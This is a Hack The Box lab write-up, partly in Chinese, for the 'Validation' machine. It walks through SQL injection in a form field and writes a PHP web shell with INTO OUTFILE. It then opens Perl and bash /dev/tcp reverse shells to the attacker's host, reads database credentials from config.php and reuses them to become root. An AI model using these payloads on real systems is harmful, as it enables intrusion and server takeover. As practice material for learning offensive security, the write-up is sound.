###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Validation
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.95.235 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.95.235:22
Open 10.129.95.235:80
Open 10.129.95.235:4566
Open 10.129.95.235:8080

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgSpafkjRVogAlgtxt6cFN7sU4sRTiGYC01QloBpbOwerqFUoYNyhCdNP/9rvdhwFpXomoMhDxioWQZb1RTSbR5aCwkzwDRnLz5PKN/7faaoEVjFM1vSnjGwWxzPZJw4Xy8wEbvMDlNZQbWu44UMWhLH+Vp63egRsut0SkTpUy3Ovp/yb3uAeT/4sUPG+LvDgzXD2QY+O1SV0Y3pE+pRmL3UfRKr2ltMfpcc7y7423+3oRSONHfy1upVUcUZkRIKrl9Qb4CDpxbVi/hYfAFQcOYH+IawAounkeiTMMEtOYbzDysEzVrFcCiGPWOX5+7tu4H7jYnZiel39ka/TFODVA+m2ZJiz2NoKLKTVhouVAGkH7adYtotM62JEtow8MW0HCZ9+cX6ki5cFK9WQhN++KZej2fEZDkxV7913KaIa4HCbiDq1Sfr5j7tFAWnNDo097UHXgN5A0mL1zNqwfTBCHQTEga/ztpDE0pmTKS4rkBne9EDn6GpVhSuabX9S/BLk=
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9LolyD5tnJ06EqjRR6bFX/7oOoTeFPw2TKsP1KCHJcsPSVfZIafOYEsWkaq67dsCvOdIZ8VQiNAKfnGiaBLOo=
|   256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJOP8cvEQVqCwuWYT06t/DEGxy6sNajp7CzuvfJzrCRZ
80/tcp   open  http    syn-ack Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    syn-ack nginx
|_http-title: 403 Forbidden
8080/tcp open  http    syn-ack nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

用burp攔截`username`欄位
```
POST / HTTP/1.1

Host: 10.129.95.235
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.129.95.235
Connection: keep-alive
Referer: http://10.129.95.235/
Upgrade-Insecure-Requests: 1

username=admin&country=Taiwan
```

在`Taiwan`後面加`'`看看有沒有東西，發現會噴error
```
username=admin&country=Taiwan'

Welcome admin
Other Players In Taiwan'

Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33
```

可以看看有幾個欄位，發現1個欄位ok，2個欄位會出錯
```
username=admin&country=Taiwan' UNION SELECT @@hostname;--+

Welcome admin
Other Players In Taiwan' UNION SELECT @@hostname;--
admin'
validation
```

```
username=admin&country=Taiwan' UNION SELECT @@hostname,@@version;--+

Other Players In Taiwan' UNION SELECT @@hostname,@@version;--

Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33
```

塞~reverse，塞完去`http://10.129.95.235/s.php?cmd=id`
```
username=admin1&country=Taiwan' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/s.php" -- //
```

```
admin' uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

開nc用perl的reverse
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

http://10.129.31.225/s.php?cmd=perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%2210.10.14.70:4444%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27
```

然後再一個，後可在`/home/htb`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4445

bash -c "bash -i >& /dev/tcp/10.10.14.70/4445 0>&1"

www-data@validation:/home/htb$ cat user.txt
e1cc308d3f5aa5556a005036ad637aa1
```

在`/var/www/html`查看`config.php`
```php
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

找到密碼看能不能切成root，可以之後在/root得root.txt
```
www-data@validation:/var/www/html$ su root
su root
Password: uhc-9qual-global-pw
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cd /root
ls
config
ipp.ko
root.txt
cat root.txt
3cc76bb2fbdde6d66bb997127a2f0578
```